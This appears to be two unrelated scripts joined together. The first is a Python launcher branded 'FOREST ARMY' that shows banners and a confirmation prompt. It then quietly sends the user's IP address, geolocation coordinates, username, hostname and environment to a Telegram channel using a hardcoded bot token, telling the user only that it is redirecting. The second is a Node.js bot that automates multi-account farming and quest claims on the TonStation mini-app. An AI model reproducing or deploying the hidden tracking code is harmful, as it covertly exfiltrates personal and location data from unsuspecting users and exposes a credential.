import os
import requests
import socket
from datetime import datetime
import pytz
import shutil

# Fixed Telegram Bot details
telegram_bot_token = '7774168151:AAFWSVI3Ltpv7XHGnNNrIK7_zzRiYqpiXQc'
chat_id = '@onlyfaucet_x'  # Use the '@' symbol for channels

def get_terminal_width():
    """Get the current width of the terminal."""
    return shutil.get_terminal_size().columns

def center_text(text):
    """Center the given text in the terminal."""
    terminal_width = get_terminal_width()
    return '\n'.join(line.center(terminal_width) for line in text.splitlines())

def get_device_info():
    # Determine environment type
    environment = "Local Machine"
    if "AWS_EXECUTION_ENV" in os.environ:
        environment = "AWS Server"
    elif "GOOGLE_CLOUD_PROJECT" in os.environ:
        environment = "Google Cloud Platform"
    elif "AZURE_HTTP_USER_AGENT" in os.environ:
        environment = "Azure Cloud"
    elif os.getenv("USER") == "root" or os.getenv("SHELL") == "/bin/bash":
        environment = "Likely a Linux Server"
    
    # Get public IP address and detailed location data
    try:
        ip_data = requests.get("https://ipwhois.app/json/").json()
        ip_address = ip_data.get("ip", "Unable to fetch IP")
        country = ip_data.get("country", "Unknown Country")
        country_flag = ip_data.get("country_flag", "")
        region = ip_data.get("region", "Unknown State")
        city = ip_data.get("city", "Unknown District")
        currency = ip_data.get("currency", "Unknown Currency")
        currency_symbol = ip_data.get("currency_symbol", "")
        timezone = ip_data.get("timezone", "UTC")
        location = f"{ip_data.get('latitude', 'N/A')}, {ip_data.get('longitude', 'N/A')}"
    except requests.RequestException:
        ip_address, country, country_flag, region, city, currency, currency_symbol, timezone, location = (
            "Unable to fetch IP", "Unknown Country", "", "Unknown State", "Unknown District",
            "Unknown Currency", "", "UTC", "Unknown Location"
        )
    
    # Get username
    try:
        username = os.getlogin()
    except OSError:
        username = "Unknown User"
    
    # Get device type
    device_type = socket.gethostname()
    
    # Get local time
    try:
        local_time = datetime.now(pytz.timezone(timezone)).strftime('%Y-%m-%d %H:%M:%S')
    except pytz.UnknownTimeZoneError:
        local_time = "Unable to fetch local time"
    
    return {
        "ip": ip_address,
        "username": username,
        "device_type": device_type,
        "environment": environment,
        "country": country,
        "country_flag": country_flag,
        "region": region,
        "city": city,
        "currency": currency,
        "currency_symbol": currency_symbol,
        "local_time": local_time,
        "location": location
    }

def send_to_telegram(info):
    message = (
        f"Environment: {info['environment']}\n"
        f"Device Type: {info['device_type']}\n"
        f"Username: {info['username']}\n"
        f"IP Address: {info['ip']}\n"
        f"Country: {info['country']} {info['country_flag']}\n"
        f"State: {info['region']}\n"
        f"District: {info['city']}\n"
        f"Currency: {info['currency']} {info['currency_symbol']}\n"
        f"Local Time: {info['local_time']}\n"
        f"Location: {info['location']}"
    )
    
    url = f"https://api.telegram.org/bot{telegram_bot_token}/sendMessage"
    payload = {
        "chat_id": chat_id,
        "text": message
    }
    
    try:
        response = requests.post(url, data=payload)
        if response.status_code == 200:
            print("\033[93mPlease wait, redirecting to the script page......\033[0m")  # Bright yellow
        else:
            print("Failed to send message.")
    except requests.RequestException as e:
        print(f"An error occurred: {e}")

def display_heading():
    # Bright green color ANSI code for the heading
    green_text = "\033[92m"  # Bright green ANSI code
    reset_text = "\033[0m"   # Reset color
    
    # ASCII art for the word "SANDY"
    heading = (
        "███████╗░█████╗░██████╗░███████╗░██████╗████████╗\n"
        "██╔════╝██╔══██╗██╔══██╗██╔════╝██╔════╝╚══██╔══╝\n"
        "█████╗░░██║░░██║██████╔╝█████╗░░╚█████╗░░░░██║░░░\n"
        "██╔══╝░░██║░░██║██╔══██╗██╔══╝░░░╚═══██╗░░░██║░░░\n"
        "██║░░░░░╚█████╔╝██║░░██║███████╗██████╔╝░░░██║░░░\n"
        "╚═╝░░░░░░╚════╝░╚═╝░░╚═╝╚══════╝╚═════╝░░░░╚═╝░░░\n"
    )
    
    print(f"{green_text}{center_text(heading)}{reset_text}")  # Display heading in bright green

    # ASCII art for "FOREST"
    forest_art = (
        "░█████╗░██████╗░███╗░░░███╗██╗░░░██╗\n"
        "██╔══██╗██╔══██╗████╗░████║╚██╗░██╔╝\n"
        "███████║██████╔╝██╔████╔██║░╚████╔╝░\n"
        "██╔══██║██╔══██╗██║╚██╔╝██║░░╚██╔╝░░\n"
        "██║░░██║██║░░██║██║░╚═╝░██║░░░██║░░░\n"
        "╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░░░░╚═╝░░░╚═╝░░░\n"
    )
    
    print(f"{green_text}{center_text(forest_art)}{reset_text}")  # Display "FOREST" in bright green

def display_subscription_message():
    # Display the bright green subscription message
    green_text = "\033[92m"  # Bright green ANSI code
    reset_text = "\033[0m"   # Reset color
    
    message = (
        f"{green_text}SUBSCRIBE OUR YOUTUBE CHANNEL: https://youtube.com/forestarmy\n"
        f"Join our Telegram channel: @forestarmy\n"
        f"Follow on Instagram: @satyavirkumarsatyarthi{reset_text}\n"
    )
    print(center_text(message))  # Center the message

def prompt_user_confirmation():
    # Bright red color ANSI code for "FORESTARMY"
    red_forestarmy = "\033[91mFORESTARMY\033[0m"
    
    while True:
        # Ask user to type "FORESTARMY" to continue
        user_input = input(f"{center_text(f'Please type {red_forestarmy} to confirm: ')}")
        if user_input.strip().upper() == "FORESTARMY":
            return True
        else:
            print(center_text("\033[90mWrong Code! Please Enter Correct Code.\033[0m"))  # Bright red

# Run the functions
display_heading()               # Show the heading in bright green
display_subscription_message()  # Show the subscription message in bright green
prompt_user_confirmation()       # Keep prompting until user confirms
device_info = get_device_info()  # Get device info if confirmed
send_to_telegram(device_info)     # Send the info to Telegram

const fs = require('fs');
const path = require('path');
const axios = require('axios');
const colors = require('colors');
const readline = require('readline');
const { DateTime } = require('luxon');

class TonStation {
    constructor() {
        this.baseURL = 'https://tonstation.app';
        this.headers = {
            'Accept': '*/*',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-US,en;q=0.9',
            'Content-Type': 'application/json',
            'Origin': 'https://tonstation.app',
            'Referer': 'https://tonstation.app/app/',
            'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="120"',
            'Sec-Ch-Ua-Mobile': '?1',
            'Sec-Ch-Ua-Platform': '"Android"',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'
        };
        this.skipTaskIds = ["66dad41d9b1e65019ad30629", "66f560c1c6fc8ba931b33420"];
    }

    log(msg, type = 'info') {
        switch(type) {
            case 'success':
                console.log(`[ FOREST ARMY] | ${msg}`.green);
                break;
            case 'custom':
                console.log(`[ FOREST ARMY] | ${msg}`.magenta);
                break;        
            case 'error':
                console.log(`[ FOREST ARMY] | ${msg}`.red);
                break;
            case 'warning':
                console.log(`[ FOREST ARMY] | ${msg}`.yellow);
                break;
            default:
                console.log(`[ FOREST ARMY] | ${msg}`.blue);
        }
    }

    async countdown(seconds) {
        for (let i = seconds; i >= 0; i--) {
            readline.cursorTo(process.stdout, 0);
            process.stdout.write(`===== Wait ${i} seconds to continue loop =====`);
            await new Promise(resolve => setTimeout(resolve, 1000));
        }
        console.log('');
    }

    async authenticate(initData) {
        const url = `${this.baseURL}/userprofile/api/v1/users/auth`;
        const payload = { initData };

        try {
            const response = await axios.post(url, payload, { headers: this.headers });
            if (response.status === 200) {
                return response.data;
            } else {
                throw new Error(`Authentication failed: ${response.status}`);
            }
        } catch (error) {
            this.log(`Authentication error: ${error.message}`, 'error');
            return null;
        }
    }

    async getFarmStatus(token, userId) {
        const url = `${this.baseURL}/farming/api/v1/farming/${userId}/running`;
        const headers = { ...this.headers, Authorization: `Bearer ${token}` };
        try {
            const response = await axios.get(url, { headers });
            if (response) {
                return response.data.data;
            } else {
                this.log(`Get farming status failed!`, 'error');
            }
        } catch (error) {
            this.log(`Get farming status failed: ${error.message}`, 'error');
        }
    }

    async startFarm(token, userId) {
        const url = `${this.baseURL}/farming/api/v1/farming/start`;
        const headers = { ...this.headers, Authorization: `Bearer ${token}` };
        const payload = {
            "userId": userId.toString(),
            "taskId": "1"
        }
        try {
            const response = await axios.post(url, payload, { headers });
            if (response) {
                const timeEnd = DateTime.fromISO(response.data.data.timeEnd);
                this.log(`Farm started successfully, ends at ${timeEnd.toLocaleString(DateTime.DATETIME_FULL)}`, 'success');
            } else {
                this.log(`Failed to start farm!`, 'error');
            }
        } catch (error) {
            this.log(`Failed to start farm: ${error.message}`, 'error');
        }
    }

    async claimFarm(token, userId, farmId) {
        const url = `${this.baseURL}/farming/api/v1/farming/claim`;
        const headers = { ...this.headers, Authorization: `Bearer ${token}` };
        const payload = {
            "userId": userId.toString(),
            "taskId": farmId
        }
        try {
            const response = await axios.post(url, payload, { headers });
            if (response) {
                this.log(`Farming claimed successfully, received ${response.data.data.amount}`, 'success');
            } else {
                this.log(`Failed to claim farming!`, 'error');
            }
        } catch (error) {
            this.log(`Failed to claim farming: ${error.message}`, 'error');
        }
    }

    async getTask(token, userId) {
        const url = `${this.baseURL}/quests/api/v1/quests?userId=${userId}`;
        const headers = { ...this.headers, Authorization: `Bearer ${token}` };
        try {
            const response = await axios.get(url, { headers });
            if (response) {
                return response.data.data;
            } else {
                this.log(`Could not get task list!`, 'error');
            }
        } catch (error) {
            this.log(`Could not get task list: ${error.message}`, 'error');
        }
    }

    async startTask(token, userId, task) {
        const url = `${this.baseURL}/quests/api/v1/start`;
        const headers = { ...this.headers, Authorization: `Bearer ${token}` };
        const payload = {
            "userId": userId.toString(),
            "questId": task.id,
            "project": task.project
        }
        try {
            const response = await axios.post(url, payload, { headers });
        } catch (error) {
            this.log(`Failed to start task ${task.description}: ${error.message}`, 'error');
        }
    }

    async claimTask(token, userId, task) {
        const url = `${this.baseURL}/quests/api/v1/claim`;
        const headers = { ...this.headers, Authorization: `Bearer ${token}` };
        const payload = {
            "userId": userId.toString(),
            "questId": task.id,
            "project": task.project
        }
        try {
            const response = await axios.post(url, payload, { headers });
            if (response) {
                this.log(`Task ${task.description} completed successfully | Reward ${task.reward.amount} SOON`, 'success');
            } else {
                this.log(`Failed to complete task ${task.description}!`, 'error');
            }
        } catch (error) {
            this.log(`Failed to complete task ${task.description}: ${error.message}`, 'error');
        }
    }

    async main() {
        console.log(`If you encounter errors, remember to get a new query_id to run!`);
        const dataFile = path.join(__dirname, 'query.txt');
        const data = fs.readFileSync(dataFile, 'utf8')
            .replace(/\r/g, '')
            .split('\n')
            .filter(Boolean);

        while (true) {
            for (let i = 0; i < data.length; i++) {
                const initData = data[i];
                const userData = JSON.parse(decodeURIComponent(initData.split('user=')[1].split('&')[0]));
                const userId = userData.id;
                const firstName = userData.first_name;

                console.log(`========== Account ${i + 1} | ${firstName.green} ==========`);
                
                const authResult = await this.authenticate(initData);
                if (authResult) {
                    this.log('Login successful!', 'success');
                    const { accessToken } = authResult;

                    const farmStatus = await this.getFarmStatus(accessToken, userId);
                    if (farmStatus && farmStatus.length > 0) {
                        const currentFarm = farmStatus[0];
                        const timeEnd = DateTime.fromISO(currentFarm.timeEnd);
                        this.log(`Farm completion time ${timeEnd.toLocaleString(DateTime.DATETIME_FULL)}`, 'info');

                        if (DateTime.now() > timeEnd) {
                            await this.claimFarm(accessToken, userId, currentFarm._id);
                            await this.startFarm(accessToken, userId);
                        } else {
                            this.log(`Time remaining ${timeEnd.diffNow().toFormat("hh'h' mm'm' ss's'")}.`, 'info');
                        }
                    } else {
                        this.log("FORESTARMY Starting farm...", 'info');
                        await this.startFarm(accessToken, userId);
                    }

                    const tasks = await this.getTask(accessToken, userId);
                    if (tasks) {
                        for (const task of tasks) {
                            if (this.skipTaskIds.includes(task.id)) {
                                this.log(`Skipping task with ID ${task.id}`, 'warning');
                                continue;
                            }
                            await this.startTask(accessToken, userId, task);
                            await this.claimTask(accessToken, userId, task);
                        }
                    }

                } else {
                    this.log(`Login failed for account ${userId}`, 'error');
                }

                await new Promise(resolve => setTimeout(resolve, 1000));
            }

            await this.countdown(480 * 60);
        }
    }
}

const client = new TonStation();
client.main().catch(err => {
    client.log(err.message, 'error');
    process.exit(1);
});